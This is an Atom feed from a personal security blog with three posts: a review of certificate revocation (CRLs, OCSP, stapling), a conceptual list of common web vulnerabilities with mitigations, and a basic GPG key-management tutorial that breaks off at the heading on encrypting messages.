<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Higher Bytes by bt3</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/bt3.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-11-02T04:20:00-05:00</updated><entry><title>On CRLs, OCSP, and a Short Review of Why Revocation Doesn't Work</title><link href="http://bt3gl.github.io/on-crls-ocsp-and-a-short-review-of-why-revocation-doesnt-work.html" rel="alternate"></link><updated>2014-11-02T04:20:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-11-02:on-crls-ocsp-and-a-short-review-of-why-revocation-doesnt-work.html</id><summary type="html">&lt;p&gt;Today we are going to talk about some regulation details of a &lt;strong&gt;SSL/TLS connection&lt;/strong&gt;. For starters, &lt;strong&gt;X.509&lt;/strong&gt; is an &lt;a href="http://en.wikipedia.org/wiki/ITU-T"&gt;ITU-T&lt;/a&gt; standard that specifies standard formats for things such as &lt;em&gt;public key certificates&lt;/em&gt; and &lt;em&gt;certificate revocation lists&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;A &lt;strong&gt;public key certificate&lt;/strong&gt; is  how websites bind their identity to a &lt;em&gt;public key&lt;/em&gt; to allow  an encrypted session (SSL/TLS) with the user. The certificate includes information about the key, the owner's &lt;em&gt;identity&lt;/em&gt;, and the &lt;em&gt;digital signature&lt;/em&gt; of the entity that issued the certificate (the &lt;a href="http://en.wikipedia.org/wiki/Certificate_authority"&gt;Certificate Authority&lt;/a&gt;, also known as CA).  As a consequence, browsers and other &lt;a href="http://en.wikipedia.org/wiki/User_agent"&gt;user-agents&lt;/a&gt; should always be able to check the authenticity of these certificates before proceeding.&lt;/p&gt;
&lt;p&gt;Some organizations need SSL/TLS simply for confidentiality (encryption), while other organizations use it to enhance trust in their security and identity. Therefore, there are varying levels of verification that a CA may do, ranging from just confirming the control of the domain name (&lt;em&gt;Domain Validation&lt;/em&gt;, DV) to more extensive identity checks (&lt;em&gt;Extended Validation&lt;/em&gt;, EV). For instance, if a site's DNS gets hijacked, while the attacker could be able to issue a controlled DV, she wouldn't be able to issue new EV certificates  just with domain validation.&lt;/p&gt;
&lt;p&gt;Since EV certificates can be valid for two years and DV certificates for up to three years, there is a possibility that these certificates lose their validity before they expire by age.  For instance, the website can lose control of its key or, as recently in the event of the &lt;strong&gt;Heartbleed bug&lt;/strong&gt; , a very large number of SSL/TLS websites needed to revoke and reissue their certificates. The need for a revocation machinery is evident.&lt;/p&gt;
&lt;p&gt;For many years, there two ways of revoking a certificate:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;by checking a  &lt;strong&gt;Certificate Revocation Lists&lt;/strong&gt; (CRLs), which are lists of serial numbers of certificates that have been revoked, provided by &lt;em&gt;each CA&lt;/em&gt;. As one can imagine, they can become quite large.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;by a communication protocol called &lt;strong&gt;Online Certificate Status Protocol&lt;/strong&gt; (OCSP), which allows a system to check with a CA for the status of a single certificate without pulling the entire CRL.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;While CRLs are long lists while OCSP only deals with a single certificate, they are both methods of getting signed and timestamped statements about the status of a certificate and they might present several issues on privacy, integrity, and availability. In this post I discuss some of these issues and I review possible alternatives.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Broken Models&lt;/h2&gt;
&lt;h3&gt;Certificate Revocation Lists (CRLs)&lt;/h3&gt;
&lt;p&gt;A CRL is a list of the serial numbers (such as 54:99:05:bd:ca:2a:ad:e3:82:21:95:d6:aa:ee:b6:5a) of unexpired security certificates which have been revoked by their issuer and should not be trusted.&lt;/p&gt;
&lt;p&gt;Each CA maintains and publishes its own CRL. CRLs are in continuous changes: old certificates expire due to their age and serial numbers of newly revoked certificates are added.&lt;/p&gt;
&lt;p&gt;The main issue here is that the original public key infrastructure (PKI) scheme does not scale since users all over the Internet are checking for  revocation and having to download files that can be many MB.  Although CRL can be cached, they are still very volatile, turning CAs into a major performance bottleneck on the Internet.&lt;/p&gt;
&lt;h3&gt;Online Certificate Status Protocol (OCSP)&lt;/h3&gt;
&lt;p&gt;OCSP was intended to replace the CRL system, however it presented several issues:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Reliability: Every time any user connects to any secured website, her  browser must query the CA's OCSP server. The typical CA issues certificates for hundreds of thousands of individual websites and the checks can be  up to  seconds.  Also, the CA might experience downtime! If an OCSP server is offline, overloaded, under attack, or unable to reply for any reason, certificate validity cannot be confirmed.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Privacy: CAs can learn the IP address of users and which websites they wish to securely visit.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Security: Browsers can not be sure a CA's server is reachable (&lt;em&gt;e.g.&lt;/em&gt;, captive portals that require one to sign in on a HTTPS site, but blocks traffic to all other sites, including CA's OCSP servers).&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;One attempt to circumvent the lack of assurance of CA's servers reliability for OCSP's checks was given by a &lt;strong&gt;soft-fail&lt;/strong&gt; option. In this case, online revocation checks which result in a &lt;em&gt;network error would be ignored&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;This brings serious issues. A simple example is when an &lt;a href="http://www.thoughtcrime.org/papers/ocsp-attack.pdf"&gt;attacker who can intercept HTTPS traffic can make online revocation checks appear to fail and bypass them&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;On the flip side, it's also not a good idea to enforce a &lt;strong&gt;hard-fail&lt;/strong&gt; check:  OCSP servers are pretty flaky/slow and you do not want to relay on their capabilities.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Some Light in a Solution&lt;/h2&gt;
&lt;h3&gt;CRLSets&lt;/h3&gt;
&lt;p&gt;Google Chrome uses a update mechanism to send lists of serial numbers of revoked certificates which are constantly added by crawling the CAs: the&lt;a href="https://dev.chromium.org/Home/chromium-security/crlsets"&gt;&lt;strong&gt;CRLSets&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This method brings  more performance and reliability to the browser and, in addition, CRLSet updates occur at least daily, which is faster than most OCSP validity periods.&lt;/p&gt;
&lt;h3&gt;OCSP stapling&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;OCSP Stapling&lt;/strong&gt; (TLS Certificate Status Request extension) is an alternative approach for checking the revocation status of certificates. It allows the presenter of a certificate to bear the resource cost involved in providing OCSP responses, instead of the CA, in a fashion reminiscent of the &lt;a href="http://en.wikipedia.org/wiki/Kerberos_(protocol)"&gt;Kerberos Ticket&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In a simple example, the certificate holder is the one who periodically queries the OCSP server, obtaining a &lt;em&gt;signed time-stamped OCSP response&lt;/em&gt;. When users attempt to connect to the website, the response is signed with the SSL/TLS handshake via the Certificate Status Request extension response. Since the stapled response is signed by the CA, it cannot be forged (without the CA's signing key).&lt;/p&gt;
&lt;p&gt;If the stapled OCSP has the &lt;a href="http://tools.ietf.org/html/draft-hallambaker-muststaple-00"&gt;Must Staple&lt;/a&gt; capability, it becomes hard-fail if a valid OCSP response is not stapled. To make a browser know this option, one can add a "must staple" assertion to the site's security certificate and/or create a new HTTP response header similar to HSTS (HTTP Strict Transport Security).&lt;/p&gt;
&lt;p&gt;Some issue is that OCSP stapling supports only one response at a time, which is insufficient for sites which use several different certificates for a single page. However, OCSP stapling is the most promising solution for the next years.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt; There is definitely a need for rethinking the way things have been doing.&lt;/p&gt;
&lt;h3&gt;References:&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.imperialviolet.org/2011/03/18/revocation.html"&gt;Imperial Violet: Revocation Doesn't work&lt;/a&gt;
&lt;a href="https://www.imperialviolet.org/2014/04/19/revchecking.html"&gt;Imperial Violet: Don't Enable Revocation Checking&lt;/a&gt;
&lt;a href="https://www.imperialviolet.org/2014/04/29/revocationagain.html"&gt;Imperial Violet: Revocation Still Doesn't Work&lt;/a&gt;
&lt;a href="https://gist.github.com/agl/876829"&gt;Proxy server for testing revocation&lt;/a&gt;
&lt;a href="https://www.imperialviolet.org/2012/02/05/crlsets.html"&gt;Revocation checking and Chrome's CRL&lt;/a&gt;
&lt;a href="https://code.google.com/p/chromium/issues/detail?id=361820"&gt;Discussion about OCSP checking at Chrome&lt;/a&gt;
&lt;a href="http://tools.ietf.org/html/draft-balfanz-tls-channelid-00"&gt;RFC Transport Layer Security (TLS) Channel IDs&lt;/a&gt;
&lt;a href="https://www.isecpartners.com/media/17919/revocation-whitepaper_pdf__2_.pdf"&gt;Fixing Revocation for Web Browsers, iSEC Partners&lt;/a&gt;
&lt;a href="https://wiki.mozilla.org/images/e/e3/SSLcertRevocation.pdf"&gt;Proposal for Better Revocation Model of SSL Certificates&lt;/a&gt;
&lt;a href="https://blog.mozilla.org/security/2013/07/29/ocsp-stapling-in-firefox/"&gt;OCSP Stapling in Firefox&lt;/a&gt;
&lt;a href="https://www.ssllabs.com/ssltest/"&gt;SSL Server Test&lt;/a&gt;
&lt;a href="https://www.digicert.com/help/"&gt;SSL Certificate Checker&lt;/a&gt;&lt;/p&gt;</summary><category term="CRL"></category><category term="CRLSets"></category><category term="OCSP"></category><category term="TLS"></category></entry><entry><title>A List of Common Web Vulnerabilities</title><link href="http://bt3gl.github.io/a-list-of-common-web-vulnerabilities.html" rel="alternate"></link><updated>2014-10-31T06:30:00-04:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-10-31:a-list-of-common-web-vulnerabilities.html</id><summary type="html">&lt;p&gt;Although nomenclatures don't help  much when you facing a security problem, I am keeping this list here for some useful organization. It is constantly been updated.&lt;/p&gt;
&lt;h2&gt;Vulnerabilities to Web Applications&lt;/h2&gt;
&lt;h3&gt;Cross-site Scripting (XSS)&lt;/h3&gt;
&lt;p&gt;HTML has five characters that are reserved: angle brackets, single and double quotes, and ampersand. The ampersand should never appear in most HTML sections. Both angle brackets shouldn't be used inside a tag, unless  properly quoted. Quote characters inside a tag can also be harmless in text. To allow these characters to appear in problematic locations, an encoding based in an ampersand-prefixed and a semicolon-terminated scheme is used: the &lt;a href="http://www.w3schools.com/html/html_entities.asp"&gt;Entity Encoding&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;XSS is caused by  insufficient input validation or output escaping. This can allow an attacker to insert HTML markup or scripts in a vulnerable website. The injected  code will have plenty of access in this site, and in many cases, to the HTTP cookies stored by the client.&lt;/p&gt;
&lt;h4&gt;Example of exploitation:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;In &lt;em&gt;password managers&lt;/em&gt;, there is a risk of  amplification of XSS bugs. In the web applications that use &lt;em&gt;&lt;a href="https://www.owasp.org/index.php/HttpOnly"&gt;httponly&lt;/a&gt;&lt;/em&gt; cookies, a successful exploitation of an XSS flaw may give the attacker a transient access to the user's account (and password).&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Attempts of mitigation:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;XSS filtering:  implementations that compare portions of the current URL with any string appearing on the retrieved page or passed to APIs such as &lt;em&gt;&lt;a href="http://www.w3schools.com/jsref/met_doc_write.asp"&gt;document.write()&lt;/a&gt;&lt;/em&gt; and &lt;em&gt;&lt;a href="http://www.w3schools.com/jsref/prop_html_innerhtml.asp"&gt;innerHTML&lt;/a&gt;&lt;/em&gt;. If the comparison reveals a portion of JavaScript that may have originated with improperly escaped URL, the portion is substituted by a harmless string. However, the filter may also append  legitimate portion of the page as a non-functional parameter in the URL. In some cases, this can create XSS vectors! One should not rely on this mechanism.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cross Script Inclusion (XSSI)&lt;/h3&gt;
&lt;p&gt;JSON is a JavaScript syntax structure  to keep in-place object serialization.  The curly bracket &lt;strong&gt;{&lt;/strong&gt; is assumed to be the beginning of the object. Overloading curly  brackets means that JSON blocks will not be recognized properly in standalone statements.&lt;/p&gt;
&lt;p&gt;XSSI comes with the failure to secure sensitive JSON-like responses against being loaded on third-party sites via &lt;code&gt;&amp;lt;script src=..&amp;gt;&lt;/code&gt;, and leaking user-specific information in the response. It a risk whenever ambient authority credentials (such as cookies) are used by the server to generate user-specific JavaScript code.&lt;/p&gt;
&lt;h3&gt;Cross-site Request Forgery (CSRF, XSRF)&lt;/h3&gt;
&lt;p&gt;On cross-domain navigation, the browser includes any ambient credentials. To the server, a request originating from its own client-side code will appear as the same as the request from a rogue third-party site and  it might be granted the same privilege.&lt;/p&gt;
&lt;p&gt;CSRF is the failure to verify that a particular state-changing HTTP request received by the &lt;strong&gt;server-side&lt;/strong&gt; portion of the application was initiated from the expected &lt;strong&gt;client-side&lt;/strong&gt; origin. Any third-party website loaded in the browser can perform actions in behalf of the victim.&lt;/p&gt;
&lt;h4&gt;Examples of exploitation:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Any two windows of frames opened in a browser will remain &lt;a href="http://en.wikipedia.org/wiki/Same-origin_policy"&gt;same-origin&lt;/a&gt; with each other even if the user logs out from one account and permitting third-party to submit password and username and log int an attacked account. For example, the attacker can open and keep a frame pointing to a sensitive page and then log the victim into the attacker-controlled account to execute some code injection. Despite the change of  HTTP credentials the code injected will access the previous loaded frame.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;In several home network routers, CSRF can permit attackers to access the device and intercept or modify the network traffic.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Attempts of mitigation:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Including a secret user- and session- specific value on the requests (as an additional query parameter or a hidden field). The attacker will not be able to read the value since access to cross-domain documents is restricted by the &lt;strong&gt;same-origin&lt;/strong&gt; policy.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Header Injection (Response Splitting)&lt;/h3&gt;
&lt;p&gt;Insufficient escaping of newlines in HTTP responses, generated by the server-side. This can lead to XSS or proxy cache poisoning.&lt;/p&gt;
&lt;h4&gt;Attempts of mitigation:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;LF and CR characters must be stripped from any attacker-controlled values in the HTTP headers.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Mixed Content&lt;/h3&gt;
&lt;p&gt;Loading non-HTTPS sub-resources on HTTPS pages undoes most of the benefits of encryption. For scripts and applets, this makes the application vulnerable to active attackers, specially in open wireless networks.&lt;/p&gt;
&lt;h3&gt;Open Redirection&lt;/h3&gt;
&lt;p&gt;Applications that perform HTTP- or script-based requests to user-supplied URLs without constraining the possible destinations in any meaningful way, leading, for example, to XSS.&lt;/p&gt;
&lt;h3&gt;Referer Leakage&lt;/h3&gt;
&lt;p&gt;HTTP requests may include a &lt;em&gt;Referer&lt;/em&gt; header that contains the URL of documents that triggered the current navigation in some way. The header also may reveal some information about the user browsing habits, such as query parameters in the referring page.&lt;/p&gt;
&lt;p&gt;This vulnerability is created by disclosure of a sensitive URL by embedding an off-site sub-resource of providing an off-site link. Any security data encoded in the URL of the parent document will be leaked in the &lt;em&gt;Referer&lt;/em&gt; header.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Vulnerabilities to Web Application Design&lt;/h2&gt;
&lt;h3&gt;Cache Poising&lt;/h3&gt;
&lt;p&gt;Long-term pollution of the browser cache (or any proxy within) with a malicious version of the targeted web application. Encrypted web applications may be targeted due to response-splitting vulnerabilities. In non-encrypted traffic, network attackers may be able to modify responses too.&lt;/p&gt;
&lt;h3&gt;Clickjacking&lt;/h3&gt;
&lt;p&gt;The act of obscuring a portion of a web application so that the victim is not aware that individual clicks are delivered to other site.&lt;/p&gt;
&lt;h3&gt;Content and Character Set Sniffing&lt;/h3&gt;
&lt;p&gt;Possibility that the browser will ignore any authoritative content type of character set information provided by the server and interpret the returned document incorrectly.&lt;/p&gt;
&lt;h4&gt;Examples of exploitation:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Scenarios where &lt;a href="http://www.w3.org/Protocols/rfc1341/4_Content-Type.html"&gt;Content-Type&lt;/a&gt; is ignored.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cookie Forcing/Injection&lt;/h3&gt;
&lt;p&gt;Possibility of blindly injecting HTTP cookies into the context of an otherwise impenetrable web application due to issues in how the mechanism is designed and implemented in  browsers. There are special concern to HTTPS applications.&lt;/p&gt;
&lt;h4&gt;Examples of exploitation:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Cookie stuffing: deleting cookies belonging to another applications by overflowing the cookie jar.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Denial-of-Service (DoS)&lt;/h3&gt;
&lt;p&gt;Any opportunity of the attacker to bring down a browser or server, or make the use of a targeted application  more difficult.&lt;/p&gt;
&lt;h3&gt;Framebusting&lt;/h3&gt;
&lt;p&gt;The possibility of a framed page navigating the top-level document to a new URL without having to satisfy &lt;strong&gt;same-origin&lt;/strong&gt; checks. It might be exploited for phishing.&lt;/p&gt;
&lt;h3&gt;HTTP Downgrade&lt;/h3&gt;
&lt;p&gt;Ability of an attacker to prevent the user from reaching an HTTPS version of a site or to downgrade an existing HTTPS session to HTTP.&lt;/p&gt;
&lt;h4&gt;Attempts of mitigation:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"&gt;Strict transport security&lt;/a&gt;:  The approach allows any site to instruct the browser that all future requests made to a particular hostname or domain should always use HTTPS and that any HTTP traffic should be automatically upgraded and submitted over  HTTPS.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Network Fenceposts&lt;/h3&gt;
&lt;p&gt;When websites let the browser to interact with destinations not directly accessible to the attacker, for example, with the systems on a victim's internal networks. This attack can be performed with help of &lt;a href="http://en.wikipedia.org/wiki/DNS_rebinding"&gt;DNS rebinding&lt;/a&gt;.&lt;/p&gt;
&lt;h4&gt;Attempts of mitigation:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Internet Explorer implements the zone model, a potential approach to the risk.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Vulnerabilities in the Server-Side&lt;/h2&gt;
&lt;h3&gt;Buffer Overflow&lt;/h3&gt;
&lt;p&gt;In low-level languages such as C or C++, buffer overflow happens when a program allows more information to be stored in a particular memory region than there is space to accommodate the incoming data, leading to the unexpected overwrite of other vital data structures.&lt;/p&gt;
&lt;h3&gt;Command Injection (SQL, PHP, Shellcode)&lt;/h3&gt;
&lt;p&gt;Due to insufficient input filtering or output escaping, an attacker-controlled strings may be processed as statements in an interpreted language used by the application.&lt;/p&gt;
&lt;h3&gt;Directory Traversal&lt;/h3&gt;
&lt;p&gt;Due to insufficient filtering (such as the failure to recognize &lt;code&gt;../&lt;/code&gt; segments) an application can be tricked into reading or writing files at arbitrary locations. Unconstrained file-writing bugs can be exploitable to run attacker-supplied code.&lt;/p&gt;
&lt;h3&gt;File Inclusion&lt;/h3&gt;
&lt;p&gt;If used without a qualifier or prefixed with a &lt;em&gt;local&lt;/em&gt; (LFI), the term is synonymous to read-related directory traversal. Remote file inclusion (RFI) is an alternative way to exploit file-inclusion vulnerabilities by specifying a URL rather than a valid file path. In some languages, a common API opens local files and fetches remote URLS, which might supplies the ability of retrieving attacker's files.&lt;/p&gt;
&lt;h3&gt;Format String Vulnerability&lt;/h3&gt;
&lt;p&gt;Several libraries accept templates (format strings) followed by a set of parameters that the function is expected to insert into the template at predefined locations. For example,  C has functions such as &lt;em&gt;printf&lt;/em&gt;, &lt;em&gt;syslog&lt;/em&gt;, etc. The vulnerability is caused by permitting attackers to supply the template to one of these functions. This can lead to  data leaks and code execution.&lt;/p&gt;
&lt;h3&gt;Integer Overflow&lt;/h3&gt;
&lt;p&gt;Vulnerability specific to languages with no range checking. The flaw is caused by the developer failing to detect that an integer exceeded the maximum possible value and rolled back to zero, to a large negative integer, or to some hardware-specific  result.&lt;/p&gt;
&lt;p&gt;Integer underflow is the opposite effect: crossing the minimum value and rolling over to a very large positive integer.&lt;/p&gt;
&lt;h3&gt;Pointer Management Vulnerabilities&lt;/h3&gt;
&lt;p&gt;In languages that use raw memory pointers such as C or C++, it is possible to use pointers that are either unitized or nor longer valid (dangling). These vulnerabilities will corrupt the internal state of the program and allow an attacker to execute attacker-supplied code.&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;References:&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://www.amazon.com/The-Tangled-Web-Securing-Applications/dp/1593273886"&gt;The Tangled Web&lt;/a&gt;&lt;/p&gt;</summary><category term="XSS"></category><category term="CSRF"></category><category term="XSSI"></category><category term="Buffer_Overflow"></category><category term="LFI"></category><category term="RFI"></category></entry><entry><title>Quick and Dirty intro to OpenPGP &amp; GPG</title><link href="http://bt3gl.github.io/quick-and-dirty-intro-to-openpgp-gpg.html" rel="alternate"></link><updated>2014-10-28T05:20:00-04:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-10-28:quick-and-dirty-intro-to-openpgp-gpg.html</id><summary type="html">&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/Pretty_Good_Privacy"&gt;Pretty Good Privacy&lt;/a&gt; (PGP) is a model that provides cryptographic privacy and authentication for data communication. It was created by &lt;a href="http://en.wikipedia.org/wiki/Phil_Zimmermann"&gt;Phil Zimmermann&lt;/a&gt; in 1991. Today, PGP is a &lt;a href="http://en.wikipedia.org/wiki/PGP_Corporation"&gt;company&lt;/a&gt; that sells a proprietary encryption program, &lt;a href="http://www.openpgp.org/"&gt;OpenPGP&lt;/a&gt; is the open protocol that defines how PGP encryption works, and &lt;a href="https://www.gnupg.org/"&gt;GnuGP&lt;/a&gt; is the free software.&lt;/p&gt;
&lt;p&gt;The distribution of PGP keys can be done using the concept of &lt;a href="http://en.wikipedia.org/wiki/Web_of_trust"&gt;web of trust&lt;/a&gt;. This is a decentralized way of establishing the authenticity  of a public key and its owner. If you want a cute (ludic) picture of the web of trust, check &lt;a href="https://twitter.com/doctorow"&gt;Cory Doctorow&lt;/a&gt;'s book &lt;a href="http://craphound.com/littlebrother/"&gt;Little Brother&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Almost 15 years after its creation, &lt;a href="https://firstlook.org/theintercept/2014/10/28/smuggling-snowden-secrets/"&gt;PGP continues to be &lt;em&gt;pretty good&lt;/em&gt;&lt;/a&gt;. But there is  still a &lt;a href="http://blog.cryptographyengineering.com/2014/08/whats-matter-with-pgp.html"&gt;need for new solutions&lt;/a&gt; (and they appear to be &lt;a href="http://googleonlinesecurity.blogspot.com/2014/06/making-end-to-end-encryption-easier-to.html"&gt;coming soon&lt;/a&gt;). Meanwhile, I wrote this tutorial and I hope you find it fun.&lt;/p&gt;
&lt;h3&gt;I. Creating  GPG keys&lt;/h3&gt;
&lt;p&gt;Simply type the following in the terminal:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --gen-key
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Chose &lt;a href="http://en.wikipedia.org/wiki/RSA_(cryptosystem)"&gt;RSA&lt;/a&gt; with  4096 bits long and expiration up to 5 years. Use a &lt;a href="https://www.eff.org/wp/defending-privacy-us-border-guide-travelers-carrying-digital-devices#passphrase"&gt;strong passphrase&lt;/a&gt; (keep it safe since it cannot be recovered).&lt;/p&gt;
&lt;h3&gt;II. Backup your Private Key&lt;/h3&gt;
&lt;p&gt;Save it with your soul:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --export-secret-keys --armor YOUR_EMAIL &amp;gt; YOUR_NAME-privkey.asc
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;III. Sharing your key&lt;/h3&gt;
&lt;p&gt;There are several ways you can share or publish your public key:&lt;/p&gt;
&lt;h4&gt;By sharing the key's fingerprint&lt;/h4&gt;
&lt;p&gt;The key's fingerprint is the same as its signature. Each PGP key has a unique fingerprint that allows you to confirm to others that they have received your actual public key without tampering. A fingerprint is a more convenient way to uniquely represent a key.&lt;/p&gt;
&lt;p&gt;To check the fingerprint of any key that you have in your keyring, type:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --fingerprint EMAIL
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;By sending the ASCII file&lt;/h4&gt;
&lt;p&gt;You can copy your key to an file to be shared:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --export --armor  YOUR_EMAIL &amp;gt; YOUR_NAME-pubkey.asc
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;By  publishing it in a public key server&lt;/h4&gt;
&lt;p&gt;You can export your key to the &lt;a href="keys.gnupg.net"&gt;GnuPG public key server&lt;/a&gt;. For this,  use your key's name (the hexadecimal number in front of the key):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --send-key KEY_NAME
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can also export it to  &lt;a href="pgp.mit.edu"&gt;pgp.mit.edu&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --keyserver hkp://pgp.mit.edu --send-key KEY_NAME
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;V. Importing Someone's Key&lt;/h3&gt;
&lt;p&gt;There are many ways you can import someone's public key:&lt;/p&gt;
&lt;h4&gt;By a shared file&lt;/h4&gt;
&lt;p&gt;If you have the ASCII file, you can type:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --import PUBKEY_FILE
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;By Public Key Server&lt;/h4&gt;
&lt;p&gt;To search for someone's key in the public key server,  type:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --search-keys NAME
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note: this is &lt;strong&gt;not&lt;/strong&gt; very safe since you can't be sure of the key's authenticity.&lt;/p&gt;
&lt;h3&gt;V. Signing a key: The Web of Trust&lt;/h3&gt;
&lt;p&gt;Signing a key tells your software that you trust the key that you have been provided (you have verified that it is associated with the person in question).&lt;/p&gt;
&lt;p&gt;To sign a key type:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --sign-key  PERSON_EMAIL
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You should allow the person whose key you are signing to enjoy the advantages of your trusted relationship. This is done by sending her back the signed key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --export --armor PERSON_EMAIL
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When you received similar &lt;em&gt;trusted&lt;/em&gt; key, you can import it  into your GPG database:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --import FILENAME
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;VI. Other Useful Commands&lt;/h3&gt;
&lt;h4&gt;To delete a key from your keyring:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --delete-key-name KEY_NAME
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;To  edit a key (for example, the expiration date):&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt; gpg --edit KEY_NAME
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;If you have more than one key:&lt;/h4&gt;
&lt;p&gt;Edit &lt;code&gt;~/.gnupg/gpg.conf&lt;/code&gt; with your favorite key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="n"&gt;KEY_NAME&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Keep your keys fresh:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --refresh-keys
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;To list your keys:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gpg --list-keys
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;And of course:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;man gpg
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;VII. Encrypting and Decryptying Messages&lt;/h3&gt;
